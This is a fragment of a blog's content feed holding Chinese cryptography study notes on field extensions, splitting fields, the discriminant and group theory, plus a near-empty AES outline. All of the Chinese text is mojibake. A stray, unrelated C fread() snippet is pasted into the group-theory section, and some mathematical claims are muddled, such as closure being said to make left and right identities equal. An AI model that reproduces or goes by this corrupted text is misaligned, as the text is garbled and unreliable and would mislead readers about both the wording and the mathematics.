‡é‡(scalar)</strong>ã€‚</p><p><strong>åŸº</strong>ï¼šæœ€å¤§çº¿æ€§æ— å…³å‘é‡ç»„</p><p>åŸºé‡Œå‘é‡çš„ä¸ªæ•°=<strong>å‘é‡ç©ºé—´ç»´åº¦</strong>$= [ F{: }K]$ $( K$ä¸Š$F$çš„åº¦)</p><blockquote><p>nç»´æ¬§å‡ é‡Œå¾—ç©ºé—´$R^n$<br>å®ç³»æ•°åº¦ä¸è¶…è¿‡$n$çš„å…¨ä½“å¤šé¡¹å¼<br>ä»¥å®æ•°ä¸ºå®šä¹‰åŸŸå’Œå€¼åŸŸçš„å…¨ä½“è¿ç»­å‡½æ•°</p></blockquote><p>$V$æ˜¯$K$ä¸Šçš„å‘é‡ç©ºé—´,é¡»æ»¡è¶³ä»¥ä¸‹æ¡ä»¶(æˆ–ç§°å…¬ç†):$\quad\forall X,Y\in V,\forall a,b\in K,e\in K$</p><ul><li><strong>åŠ æ³•é˜¿è´å°”ç¾¤</strong>:å‘é‡é—´çš„åŠ æ³•</li><li><strong>æ ‡é‡ä¹˜æ³•</strong>:<ul><li>å°é—­æ€§:$aX\in V$</li><li>ç»“åˆå¾‹:$a(bX)=(abX)$</li><li>å•ä½å…ƒ: $eX=X$</li><li>åˆ†é…å¾‹:$a(X+Y)=aX+aY\quad(a+b)X=aX+bX$</li></ul></li></ul><h3 id="æœ‰é™æ‰©å¼ -finite-extension"><a href="#æœ‰é™æ‰©å¼ -finite-extension" class="headerlink" title="æœ‰é™æ‰©å¼ (finite extension)"></a>æœ‰é™æ‰©å¼ (finite extension)</h3><p><strong>å®šä¹‰</strong>ï¼šè®¾$F$æ˜¯Kçš„æ‰©åŸŸã€‚$F$æ˜¯$K$ä¸Šæœ‰é™ç»´åº¦çš„å‘é‡ç©ºé—´ï¼Œç§°$F$æ˜¯$K$çš„<strong>æœ‰é™æ‰©å¼ </strong>æˆ–<strong>æœ‰é™æ‰©åŸŸ</strong> (finite extension field) ã€‚</p><p>æœ‰é™åŸŸæ˜¯æœ‰é™ç»´åº¦çš„å‘é‡ç©ºé—´$\Longrightarrow$æœ‰é™åŸŸçš„åº¦æ˜¯æœ‰é™çš„</p><p>æ¯ä¸ªåŸŸå¯ä»¥çœ‹ä½œè‡ªèº«çš„ä¼˜å…ˆæ‰©å¼ ï¼š</p><ul><li>$[K{:}K]=1$</li><li>$[F{:}K]=1\Leftrightarrow F=K$</li></ul><blockquote><ul><li><p>$[Q(\sqrt2):Q]=2\ åŸºï¼š{1ã€\sqrt2}$ </p><p>$Q(\sqrt2)={a+b\sqrt2\|a,b\in Q}$</p></li><li><p>$[C:R]=2\ åŸºï¼š{1ã€i}$</p></li><li><p>$[R:Q]=âˆ$</p></li></ul></blockquote><p><strong>å®šç†1</strong>ï¼š$F$æ˜¯$L$çš„æœ‰é™æ‰©å¼ ï¼Œ$L$æ˜¯$K$çš„æœ‰é™æ‰©å¼ ï¼Œåˆ™$F$æ˜¯$K$çš„æœ‰é™æ‰©å¼ ï¼Œä¸”<br>$[F:K]=[F:L][L:K]$</p><p><strong>å®šç†2</strong>ï¼šæœ‰é™æ‰©å¼ æ—¶ä»£æ•°æ‰©å¼ (ä»£æ•°æ‰©åŸŸ)</p><h3 id="å•ä»£æ•°æ‰©å¼ -simple-algebraic-extension"><a href="#å•ä»£æ•°æ‰©å¼ -simple-algebraic-extension" class="headerlink" title="å•ä»£æ•°æ‰©å¼ (simple algebraic extension)"></a>å•ä»£æ•°æ‰©å¼ (simple algebraic extension)</h3><p><strong>å®šä¹‰ï¼š</strong>$F$æ˜¯$K$çš„æ‰©åŸŸï¼Œ$a\in F$,ä¸”$a$æ˜¯$K$ä¸Šä»£æ•°çš„ï¼Œç§°$K(a)$æ˜¯ $K$çš„<strong>å•</strong><br><strong>ä»£æ•°æ‰©å¼ æˆ–å•ä»£æ•°æ‰©åŸŸ (simple algebraic extension field)</strong>ã€‚</p><p><strong>å®šç†1</strong>:$g(x)\in K[X]æ˜¯ä¸å¯çº¦å¤šé¡¹å¼\Rightarrow(g(x))æ˜¯æå¤§ç†æƒ³$</p><p><strong>å®šç†2</strong>:$g(x)\in K[X]æ˜¯Kä¸Šä¸å¯çº¦å¤šé¡¹å¼,åˆ™å­˜åœ¨Kçš„å•ä»£æ•°æ‰©å¼ ,å®ƒä»¥g(x)çš„æ ¹ä¸ºå®šä¹‰å…ƒç´ $</p><p><strong>å®šç†3</strong>:$g(x)\in K[X]$æ˜¯$K$ä¸Šä¸å¯çº¦å¤šé¡¹å¼ï¼Œ$a,b$æ˜¯$g(x)$çš„ä¸¤ä¸ªæ ¹ï¼Œåˆ™$K(a)\cong K(b)$ (åŒæ„ä¸ºæŠŠ$a$æ˜ å°„æˆ$b)$</p><p>$I$æ˜¯æå¤§ç†æƒ³$\Leftrightarrow R/I$ æ˜¯åŸŸ($R$æ˜¯å«å¹ºäº¤æ¢ç¯)</p><p>$(g(x))$æ˜¯æå¤§ç†æƒ³$\Leftrightarrow K[X]/(g(x))$   ($K[X]$æ˜¯å«å¹ºäº¤æ¢ç¯)</p><p>è®¾$F$æ˜¯$K$çš„æ‰©åŸŸï¼Œ$a\in F$æ˜¯$K$ä¸Šä»£æ•°çš„ï¼Œ$g(x)$æ˜¯ç›¸åº”çš„æå°å¤šé¡¹å¼ï¼Œ<br>åº¦ä¸º$n$,åˆ™:</p><ul><li>æ€§è´¨1:$K(a)\cong K[X]/(g(x))$</li><li>æ€§è´¨2:$[K(a):K]=n$,ä¸”$(e,a,â€¦,a^{n-1})$æ˜¯$K$ä¸Š$K(a)$çš„åŸº</li><li>æ€§è´¨3:$\forall b\in K(a)$éƒ½æ˜¯$K$ä¸Šä»£æ•°çš„ï¼Œç›¸åº”æå°å¤šé¡¹å¼çš„åº¦éƒ½æ˜¯$n$<strong>çš„å› å­</strong></li></ul><p>$L$æ˜¯$K$çš„æœ‰é™æ‰©å¼ $\Rightarrow L$æ˜¯$K$çš„ä»£æ•°æ‰©å¼ <br>$L$æ˜¯$K$çš„æœ‰é™æ‰©å¼ $\not\Leftarrow L$æ˜¯$K$çš„ä»£æ•°æ‰©å¼ </p><blockquote><p>ä¾‹ï¼šRæ˜¯Qçš„æ‰©åŸŸï¼Œ$\sqrt2\in R$ </p><p>(1)$Q(\sqrt{2})$æ˜¯Qçš„å•ä»£æ•°æ‰©å¼  ?</p><p>$g(x)=x^2-2\in Q[X]$,æœ‰$g(\sqrt{2})=0$,åˆ™$\sqrt{2}$æ˜¯Qä¸Šä»£æ•°çš„ï¼Œ<br>æ‰€ä»¥ï¼Œ$\mathbb{Q}(\sqrt{2})$æ˜¯Qçš„å•ä»£æ•°æ‰©å¼ ã€‚</p><p>(2)ä¸ºä»€ä¹ˆ$[Q( \sqrt {2}) {: }Q] = 2$ ? </p><p>äº‹å®ä¸Šï¼Œ$g(x)=x^2-2$æ˜¯Qä¸Š$\sqrt{2}$çš„æå°å¤šé¡¹å¼ã€‚</p><p>å› ä¸º$deg(g(x))=2$,æ‰€ä»¥$\left[Q(\sqrt{2}){:}Q\right]=2$,å³$Q(\sqrt{2})$çš„åŸºæœ‰ä¸¤ä¸ªå…ƒç´ </p><p>(3)$Q(\sqrt{2})$çš„å…ƒç´ éƒ½é•¿ä»€ä¹ˆæ ·ï¼Ÿ</p><p>åŸºçš„ä¸¤ä¸ªå…ƒç´ ï¼š($\sqrt2)^0=1$ã€($\sqrt{2})^1=\sqrt{2}$</p><p>å› æ­¤ï¼Œ$Q(\sqrt2)={b_0+b_1\sqrt2\mid b_0,b_1\in Q}$</p><p>ä¾‹ï¼š$Z_3={0,1,2}$æ˜¯åŸŸï¼Œ$g(x)=x^2+x+2\in\mathbb{Z}_3[X]$æ˜¯$\mathbb{Z}_3$ä¸Šä¸å¯çº¦çš„ã€‚</p><p>è®¾$a:=[x]\in\mathbb{Z}_3/(g(x))$æ˜¯$g(x)$çš„æ ¹ï¼Œå³$g(a)=a^2+a+2=0$</p><p>å› ä¸º$deg(g(x))=2$,åˆ™$Z_3(a)$çš„åŸºæœ‰ä¸¤ä¸ªå…ƒç´ ï¼š$1=a^0$å’Œ$a=a^1$</p><p>æ‰€ä»¥ï¼Œ$Z_3(a)={b_0+b_1a\mid b_0,b_1\in Z_3}={0,1,2,a,a+1,a+2,2a,2a+1,2a+2}$</p><p>$2a+2$ä¹Ÿæ˜¯$g(x)$çš„æ ¹ï¼Œå› ä¸º$g(2a+2)=(2a+2)^2+(2a+2)+2=0$<br>å› ä¸º$deg(g(x))=2$,åˆ™$Z_3(2a+2)$çš„åŸºæœ‰ä¸¤ä¸ªå…ƒç´ ï¼š1å’Œ$2a+2$<br>æ‰€ä»¥ï¼Œ$Z_3(2a+2)={b_0+b_1(2a+2)\mid b_0,b_1\in Z_3}={0,1,2,a,a+1,a+2,2a,2a+1,2a+2}=Z_3(a)$</p></blockquote><h4 id="æ„é€ å•ä»£æ•°æ‰©å¼ "><a href="#æ„é€ å•ä»£æ•°æ‰©å¼ " class="headerlink" title="æ„é€ å•ä»£æ•°æ‰©å¼ "></a>æ„é€ å•ä»£æ•°æ‰©å¼ </h4><ul><li>1.$æ‰¾Kä¸Šä¸å¯çº¦å¤šé¡¹å¼,è®¾ä¸ºg(x)$</li><li>2.$æ‰¾g(x)çš„ä¸€ä¸ªæ ¹,è®¾ä¸ºaã€‚å•ä»£æ•°æ‰©å¼ å°±æ˜¯K(a)$</li><li>3.$è®¾deg(g(x))=n,åˆ™K(a)çš„åŸºä¸º: e,a,â€¦,a^{n-1}$</li><li>4.$K(a)å…ƒç´ :b_0+b_1a+\cdots+b_{n-1}a^{n-1}\left(b_i\in K\right)$</li></ul><h4 id="åº”ç”¨å•ä»£æ•°æ‰©å¼ "><a href="#åº”ç”¨å•ä»£æ•°æ‰©å¼ " class="headerlink" title="åº”ç”¨å•ä»£æ•°æ‰©å¼ "></a>åº”ç”¨å•ä»£æ•°æ‰©å¼ </h4><p><strong>å®šç†1</strong>:$Fæ˜¯Kçš„æ‰©åŸŸ,a,b\in F,åˆ™ K(a,b)=K(a)(b)$</p><p><strong>å®šç†2</strong>:$Fæ˜¯Kçš„æ‰©åŸŸï¼Œa_1,â€¦,a_m\in F,åˆ™K(a_1,â€¦,a_m)=K(a_1,â€¦,a_{m-1})(a_m)$</p><p><strong>å®šç†3</strong>:$a_1,â€¦,a_mæ˜¯Kä¸Šä»£æ•°çš„\Rightarrow K(a_1,â€¦,a_m)$æ˜¯æœ‰é™æ‰©å¼ /ä»£æ•°æ‰©å¼ </p><blockquote><p>å¦‚ä½•è®¡ç®— $K(a_1,â€¦,a_m)$ çš„æ‰©å¼ ç»´åº¦$[K(a_1,â€¦,a_m){:}K]$</p><p>ä¾‹ï¼šæ±‚ [$Q(\sqrt2,\sqrt3){:}Q]$</p><p>è§£ï¼š$[Q(\sqrt{2}){:}Q]=2,[Q(\sqrt{2})(\sqrt{3}){:}Q(\sqrt{2})]=2$</p><script type="math/tex; mode=display">\begin{aligned}[Q(\sqrt{2},\sqrt{3});Q]&=[Q(\sqrt{2})(\sqrt{3});Q]\\&=[Q(\sqrt{2})(\sqrt{3});Q(\sqrt{2})][Q(\sqrt{2});Q]\\&=2\times2\\&=4\end{aligned}</script></blockquote><p><strong>å®šç†4</strong>ï¼š$L$æ˜¯Kçš„æœ‰é™æ‰©å¼ $\Leftrightarrow$å­˜åœ¨$a_1,â€¦,a_m\in L$æ˜¯$K$ä¸Šä»£æ•°çš„ï¼Œä½¿å¾—$L=K(a_1,â€¦,a_m)$</p><h3 id="åˆ†è£‚åŸŸ-splitting-field"><a href="#åˆ†è£‚åŸŸ-splitting-field" class="headerlink" title="åˆ†è£‚åŸŸ(splitting field)"></a>åˆ†è£‚åŸŸ(splitting field)</h3><p><strong>å®šä¹‰(åˆ†è£‚)</strong>:$L$æ˜¯$K$çš„æ‰©åŸŸï¼Œ$f(x)\in K[X]$æ˜¯éå¸¸æ•°å¤šé¡¹å¼ $(deg(f(x))&gt;0),å¦‚æœf(x)$å¯ä»¥å†™æˆä¸€æ¬¡å› å¼ä¹˜ç§¯çš„å½¢å¼ï¼š<br>$f(x)=b(x-a_1)(x-a_2)â€¦(x-a_m)$ ($b$æ˜¯$f(x)$é¦–é¡¹ç³»æ•°)<br>å…¶ä¸­ï¼Œ$a_1,â€¦,a_m\in L$,ç§° $f(x)$åœ¨$L$é‡Œ<strong>åˆ†è£‚</strong>ã€‚</p><p><strong>å®šä¹‰(åˆ†è£‚åŸŸ)</strong>:$f(x)$åœ¨$L$é‡Œåˆ†è£‚ï¼Œä¸”$L=K(a_1,â€¦,a_m)$,åˆ™ç§°$L$æ˜¯$K$ä¸Š$f(x)$<br>çš„<strong>åˆ†è£‚åŸŸ</strong>ã€‚</p><p><strong>åˆ†è£‚åŸŸæ˜¯æœ‰é™æ‰©å¼ /ä»£æ•°æ‰©å¼ </strong></p><p>$[L:K]\leq deg(f(x))$</p><p>ç”¨ä¸å¯çº¦å¤šé¡¹å¼çš„ä¸€ä¸ªæ ¹$a$æ„é€ çš„åŸŸ$K(a)$ä¸ä¸€å®šæ˜¯$g(x)$çš„åˆ†è£‚åŸŸï¼Œå› ä¸ºå®ƒæœªå¿…åŒ…å«$g(x)$çš„æ‰€æœ‰æ ¹ã€‚</p><blockquote><script type="math/tex; mode=display">\begin{aligned}&\text{ä¾‹:}f(x)=3(x^2-2)(x^2-3)(x^2-6)(x^2+1)\in Q[X]\text{,æ±‚}f(x)\text{çš„åˆ†è£‚åŸŸ}\\&\text{è§£:}f(x)=3(x^2-2)(x^2-3)(x^2-6)(x^2+1)\\&=3(x-\sqrt{2})(x+\sqrt{2})(x-\sqrt{3})(x+\sqrt{3})\\&(x-\sqrt{6})(x+\sqrt{6})(x-i)(x+i)\\&\text{æ‰€ä»¥,}f(x)\text{çš„æ ¹ä¸º}\pm\sqrt{2}\text{ã€}\pm\sqrt{3}\text{ã€}\pm\sqrt{6}\text{ã€}\pm i\text{ã€‚}\end{aligned}</script><p><script type="math/tex">Q(\sqrt{2},-\sqrt{2},\sqrt{3},-\sqrt{3},\sqrt{6},-\sqrt{6},i,-i)</script>åŒ–ç®€æ€è€ƒè¿‡ç¨‹ï¼š</p><ul><li>$-\sqrt{2}\in Q(\sqrt{2})$,åˆ™$Q(\sqrt{2},-\sqrt{2})=Q(\sqrt{2})$</li><li>$\sqrt{3}\notin Q(\sqrt{2}$ ),åˆ™$Q(\sqrt{2},-\sqrt{2},\sqrt{3})=Q(\sqrt{2},\sqrt{3})$</li><li>$-\sqrt{3}\in Q(\sqrt{2},\sqrt{3})$,åˆ™$Q(\sqrt{2},-\sqrt{2},\sqrt{3},-\sqrt{3})=Q(\sqrt{2},\sqrt{3})$</li><li>$\pm\sqrt{6}\in Q(\sqrt{2},\sqrt{3})$,åˆ™$Q(\sqrt{2},-\sqrt{2},\sqrt{3},-\sqrt{3},\sqrt{6},-\sqrt{6})=Q(\sqrt{2},\sqrt{3})$</li><li>$i\notin Q(\sqrt{2},\sqrt{3})$,åˆ™$Q(\sqrt{2},-\sqrt{2},\sqrt{3},-\sqrt{3},\sqrt{6},-\sqrt{6},i)=Q(\sqrt{2},\sqrt{3},i)$</li><li>$-i\in Q(\sqrt{2},\sqrt{3},i)$,åˆ™$Q(\sqrt{2},-\sqrt{2},\sqrt{3},-\sqrt{3},\sqrt{6},-\sqrt{6},i,-i)=Q(\sqrt{2},\sqrt{3},i)$</li></ul><p>$f(x)çš„åˆ†è£‚åŸŸä¸ºQ(\sqrt{2},\sqrt{3},i)(å®ƒæ˜¯åŒ…å«Qå’Œf(x)æ‰€æœ‰æ ¹çš„æœ€å°æ‰©åŸŸ)$</p></blockquote><p><strong>å®šç†1(åˆ†è£‚åŸŸçš„å­˜åœ¨æ€§å’Œå”¯ä¸€æ€§)</strong>:å¯¹äº$\forall f(x)\in K[X]$éå¸¸æ•°å¤šé¡¹å¼åˆ™å­˜åœ¨$K$ä¸Š$f(x)$çš„åˆ†è£‚åŸŸã€‚è€Œä¸”ï¼Œä»»ä½•$K$ä¸Š$f(x)$ çš„åˆ†è£‚åŸŸéƒ½æ˜¯åŒæ„çš„</p><h4 id="åˆ†è£‚åŸŸçš„åº”ç”¨é‡æ ¹åˆ¤åˆ«å¼"><a href="#åˆ†è£‚åŸŸçš„åº”ç”¨é‡æ ¹åˆ¤åˆ«å¼" class="headerlink" title="åˆ†è£‚åŸŸçš„åº”ç”¨é‡æ ¹åˆ¤åˆ«å¼"></a>åˆ†è£‚åŸŸçš„åº”ç”¨é‡æ ¹åˆ¤åˆ«å¼</h4><p><strong>å®šä¹‰(åˆ¤åˆ«å¼)</strong>:$f(x)\in K[X],deg(f(x))\geq2,f(x)=b(x-a_1)(x-$<br>$a_2)â€¦(x-a_m)$ (bæ˜¯$f(x)$é¦–é¡¹ç³»æ•°),$a_1,â€¦,a_m$å±äº$f(x)$åœ¨$K$ ä¸Šçš„åˆ†è£‚åŸŸï¼Œåˆ™$f(x)$çš„<strong>åˆ¤åˆ«å¼(discriminant)</strong>ä¸º</p><script type="math/tex; mode=display">D\big(f(x)\big)=b^{2m-2}\prod_{1\leq i<j\leq m}(a_i-a_j)^2</script>]]></content>
      
      
      <categories>
          
          <category> Cryptoæ•°å­¦åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¯†ç å­¦ </tag>
            
            <tag> æŠ½è±¡ä»£æ•° </tag>
            
            <tag> ç­‘åŸºç¯‡ </tag>
            
            <tag> ç¯è®º </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯†ç ç®—æ³•ç¯‡Â·AES</title>
      <link href="/2024/08/04/%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E7%AF%87%C2%B7AES/"/>
      <url>/2024/08/04/%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E7%AF%87%C2%B7AES/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/francisrstokes/githublog/blob/main/2022/6/15/rolling-your-own-crypto-aes.md">githublog/2022/6/15/rolling-your-own-crypto-aes.md at main Â· francisrstokes/githublog</a></p><h2 id="åˆå§‹å˜æ¢-initial-round"><a href="#åˆå§‹å˜æ¢-initial-round" class="headerlink" title="åˆå§‹å˜æ¢(initial round)"></a>åˆå§‹å˜æ¢(initial round)</h2><h2 id="9è½®å¾ªç¯è¿ç®—-9-rounds"><a href="#9è½®å¾ªç¯è¿ç®—-9-rounds" class="headerlink" title="9è½®å¾ªç¯è¿ç®—(9 rounds)"></a>9è½®å¾ªç¯è¿ç®—(9 rounds)</h2><h3 id="å­—èŠ‚ä»£æ¢-SubBytes"><a href="#å­—èŠ‚ä»£æ¢-SubBytes" class="headerlink" title="å­—èŠ‚ä»£æ¢(SubBytes)"></a>å­—èŠ‚ä»£æ¢(SubBytes)</h3><p>æŸ¥è¡¨</p><h3 id="è¡Œç§»ä½-ShiftRows"><a href="#è¡Œç§»ä½-ShiftRows" class="headerlink" title="è¡Œç§»ä½(ShiftRows)"></a>è¡Œç§»ä½(ShiftRows)</h3><h3 id="åˆ—æ··åˆ-MixColumns"><a href="#åˆ—æ··åˆ-MixColumns" class="headerlink" title="åˆ—æ··åˆ(MixColumns)"></a>åˆ—æ··åˆ(MixColumns)</h3><h3 id="è½®å¯†é’¥åŠ -AddRoundKey"><a href="#è½®å¯†é’¥åŠ -AddRoundKey" class="headerlink" title="è½®å¯†é’¥åŠ (AddRoundKey)"></a>è½®å¯†é’¥åŠ (AddRoundKey)</h3><h2 id="1è½®æœ€ç»ˆè½®-Final-Round"><a href="#1è½®æœ€ç»ˆè½®-Final-Round" class="headerlink" title="1è½®æœ€ç»ˆè½®(Final Round)"></a>1è½®æœ€ç»ˆè½®(Final Round)</h2>]]></content>
      
      
      <categories>
          
          <category> å¯†ç ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AES </tag>
            
            <tag> å¯†ç å­¦ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç­‘åŸºç¯‡Â·æŠ½è±¡ä»£æ•°Â·ç¾¤è®º</title>
      <link href="/2024/08/01/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E7%BE%A4%E8%AE%BA/"/>
      <url>/2024/08/01/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E7%BE%A4%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·äºŒï¼ˆç¾¤è®ºï¼‰"><a href="#å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·äºŒï¼ˆç¾¤è®ºï¼‰" class="headerlink" title="å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·äºŒï¼ˆç¾¤è®ºï¼‰"></a>å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·äºŒï¼ˆç¾¤è®ºï¼‰</h2><hr><h1 id="ç¾¤è®º"><a href="#ç¾¤è®º" class="headerlink" title="ç¾¤è®º"></a>ç¾¤è®º</h1><hr><h2 id="ä»£æ•°ç»“æ„-algebraic-structure"><a href="#ä»£æ•°ç»“æ„-algebraic-structure" class="headerlink" title="ä»£æ•°ç»“æ„(algebraic structure)"></a>ä»£æ•°ç»“æ„(algebraic structure)</h2><p>$(G,ğŸ±,ğŸ¥’\dots$)</p><p>$GæŒ‡éç©ºé›†åˆï¼Œ\underbrace{ğŸ±, ğŸ¥’ ,\dots}_{äºŒå…ƒè¿ç®—(éœ€è¦ä¸¤ä¸ªè¿ç®—æ•°)}$</p><script type="math/tex; mode=display">\begin{align}   å°é—­æ€§ï¼š\forall\ a,b & \in G,   \\   ağŸ±b & \in G\\a ğŸ¥’ b & \in G\\ \dots \\é›†åˆä¸­ä»»æ„ä¸¤ä¸ªå…ƒç´ è¿ç®—&çš„ç»“æœä»ç„¶æ˜¯è¿™ä¸ªé›†åˆé‡Œçš„å…ƒç´ \end{align}</script><p><strong>ä»£æ•°ç»“æ„å¿…é¡»æ»¡è¶³å°é—­æ€§</strong></p><blockquote><p> xxxxxxxxxx6 1size_t fread(void <em>ptr, size_t size, size_t nmemb, FILE </em>stream)2â€‹3ptr â€“ è¿™æ˜¯æŒ‡å‘å¸¦æœ‰æœ€å°å°ºå¯¸ size*nmemb å­—èŠ‚çš„å†…å­˜å—çš„æŒ‡é’ˆ4size â€“ è¿™æ˜¯è¦è¯»å–çš„æ¯ä¸ªå…ƒç´ çš„å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½5nmemb â€“ è¿™æ˜¯å…ƒç´ çš„ä¸ªæ•°ï¼Œæ¯ä¸ªå…ƒç´ çš„å¤§å°ä¸º size å­—èŠ‚6stream â€“ è¿™æ˜¯æŒ‡å‘ FILE å¯¹è±¡çš„æŒ‡é’ˆï¼Œè¯¥ FILE å¯¹è±¡æŒ‡å®šäº†ä¸€ä¸ªè¾“å…¥æµC</p></blockquote><hr><h2 id="ç¾¤-Group"><a href="#ç¾¤-Group" class="headerlink" title="ç¾¤(Group)"></a>ç¾¤(Group)</h2><p><strong>å®šä¹‰</strong>ï¼šè‹¥<script type="math/tex">(G,*)</script>æ˜¯ä¸€ä¸ªç¾¤ï¼Œåˆ™å®ƒæ»¡è¶³ä»¥ä¸‹<strong>æ€§è´¨</strong>ï¼š</p><ul><li><p>å°é—­æ€§ï¼š$ \forall a,b\in \mathbb{G}, a*b \in \mathbb{G}$</p></li><li><p>ç»“åˆå¾‹ï¼š<script type="math/tex">\forall a,b,c\in \mathbb{G}, a*(b*c)=(a*b)*c</script></p></li><li><p>å•ä½å…ƒ(å¹ºå…ƒ,identity)ï¼š<script type="math/tex">\exists e\in \mathbb{G} , \forall a\in \mathbb{G} , a*e=e*a=a</script></p><p><strong>å®šç†1ï¼šç¾¤é‡Œçš„å•ä½å…ƒæ˜¯å”¯ä¸€çš„</strong></p></li><li><p>é€†å…ƒ(inverse)ï¼š<script type="math/tex">\exists b\in \mathbb{G} , a*b=b*a=e</script><br><script type="math/tex">açš„é€†å…ƒè®°ä¸ºa^{-1},å³a^{-1}=b,b^{-1}=aï¼Œ\\å•ä½å…ƒä»¥è‡ªèº«ä¸ºé€†å…ƒ</script></p><p><strong>å®šç†2:æ¯ä¸ªå…ƒç´ éƒ½æœ‰å”¯ä¸€çš„é€†å…ƒ</strong></p></li></ul><blockquote><p>ä¾‹ï¼š</p><p>$(\mathbb{Z},+)$<br>å°é—­æ€§ï¼šæ•´æ•°ç›¸åŠ è¿˜æ˜¯æ•´æ•°<br>ç»“åˆå¾‹ï¼šæ•´æ•°ç›¸åŠ æ»¡è¶³åŠ æ³•ç»“åˆå¾‹<br>å•ä½å…ƒï¼š0 (ä»»ä½•æ•´æ•°åŠ 0éƒ½ç­‰äºå®ƒæœ¬èº«)<br>é€† å…ƒï¼šæ•´æ•°çš„ç›¸åæ•°<br><strong>æ˜¯ç¾¤ğŸ˜Š</strong></p><p>$(\mathbb{Q},\times)$<br>å°é—­æ€§ï¼šæœ‰ç†æ•°ç›¸ä¹˜è¿˜æ˜¯æœ‰ç†æ•°<br>ç»“åˆå¾‹ï¼šæœ‰ç†æ•°ç›¸ä¹˜æ»¡è¶³ä¹˜æ³•ç»“åˆå¾‹<br>å•ä½å…ƒï¼š1 (ä»»ä½•æœ‰ç†æ•°ä¹˜1éƒ½ç­‰äºå®ƒæœ¬èº«)<br>é€† å…ƒï¼šæœ‰ç†æ•°çš„å€’æ•°(0é™¤å¤–)<br><strong>ä¸æ˜¯ç¾¤ğŸ˜­</strong><br>$(\mathbb{Q}\setminus{0},\times)$å°±æ˜¯<strong>ç¾¤</strong>äº†</p><p>$(\mathbb{Z_p^<em>},\times)$<br>å°é—­æ€§ï¼šç›¸ä¹˜å†æ¨¡pï¼Œè¿˜æ˜¯$\mathbb{Z_p^</em>}$é‡Œçš„å…ƒç´ <br>ç»“åˆå¾‹ï¼šæ¨¡è¿ç®—ä¸‹ä¹˜æ³•æ»¡è¶³ä¹˜æ³•ç»“åˆå¾‹<br>å•ä½å…ƒï¼š1 <br>é€† å…ƒï¼šä¹˜æ³•é€†å…ƒ<br><strong>æ˜¯ç¾¤ğŸ˜Š</strong></p></blockquote><p>â€œ$(\mathbb{G},*)$æ˜¯ä¸€ä¸ªç¾¤â€,é€šå¸¸ç®€å†™ä½œï¼šâ€œ$\mathbb{G}$æ˜¯ä¸€ä¸ªç¾¤â€</p><blockquote><p>ä¾‹ï¼šç®€ç§°â€œ$\mathbb{Z}_p^*$ æ˜¯ä¸€ä¸ªç¾¤â€,é»˜è®¤è¿ç®—ä¸ºâ€œæ¨¡$p$ä¸‹çš„ä¹˜æ³•â€</p></blockquote><hr><h2 id="ä¸€äº›æ¦‚å¿µ"><a href="#ä¸€äº›æ¦‚å¿µ" class="headerlink" title="ä¸€äº›æ¦‚å¿µ"></a>ä¸€äº›æ¦‚å¿µ</h2><p><strong>æœ‰é™ç¾¤</strong>ï¼š$\mathbb{G}$æ˜¯æœ‰é™é›†ï¼Œæ¯”å¦‚ $(\mathbb{Z}_p^*,X)$ç§°$\mathbb{G}$é‡Œå…ƒç´ ä¸ªæ•°ä¸ºç¾¤$\mathbb{G}$çš„â€œé˜¶â€,è®°ä¸º$|\mathbb{G}|$</p><p><strong>æ— é™ç¾¤</strong>ï¼š$\mathbb{G}$æ˜¯æ— é™é›†ï¼Œæ¯”å¦‚$(\mathbb{Z},+)$ã€$(\mathbb{Q}\setminus{0},\times)$ï¼Œç¾¤$\mathbb{G}$çš„â€œé˜¶â€ä¸º<strong>æ— é™é˜¶</strong></p><p><strong>å•ä½å…ƒã€é€†å…ƒ</strong></p><ul><li>å°é—­æ€§$\Rightarrow$å·¦å•ä½å…ƒ=å³å•ä½å…ƒ=å•ä½å…ƒ</li><li>ç»“åˆå¾‹$\Rightarrow$å·¦é€†å…ƒ=å³é€†å…ƒ=é€†å…ƒ</li></ul><p><strong>å¹³å‡¡ç¾¤</strong>ï¼šç¾¤é‡Œåªæœ‰ä¸€ä¸ªå…ƒç´ æ—¶ï¼Œç§°ä¸ºâ€œå¹³å‡¡ç¾¤â€ã€‚å”¯ä¸€å…ƒç´ å°±æ˜¯å•ä½å…ƒã€‚</p><blockquote><p>å¦‚:$({1},\times)$<br>å°é—­æ€§ï¼š1$\times$1=1<br>ç»“åˆå¾‹ï¼šä¹˜æ³•ç»“åˆå¾‹<br>å•ä½å…ƒï¼š1 <br>é€† å…ƒï¼š1$\times$1=1<br></p></blockquote><hr><h2 id="ç¾¤çš„æ€§è´¨"><a href="#ç¾¤çš„æ€§è´¨" class="headerlink" title="ç¾¤çš„æ€§è´¨"></a>ç¾¤çš„æ€§è´¨</h2><ul><li>(æ¶ˆå»å¾‹) <script type="math/tex">a*b=a*c\Rightarrow b=c</script></li><li>æ–¹ç¨‹$a*x=b\ æœ‰å”¯ä¸€è§£ä¸‹\in \mathbb{G}$</li><li><script type="math/tex; mode=display">(a*b)^{-1}=b^{-1}*a^{-1}</script></li><li>$(a^{-1})^{-1}=a$</li></ul><hr><h2 id="é˜¿è´å°”ç¾¤ï¼ˆabelian-groupï¼‰"><a href="#é˜¿è´å°”ç¾¤ï¼ˆabelian-groupï¼‰" class="headerlink" title="é˜¿è´å°”ç¾¤ï¼ˆabelian groupï¼‰"></a>é˜¿è´å°”ç¾¤ï¼ˆabelian 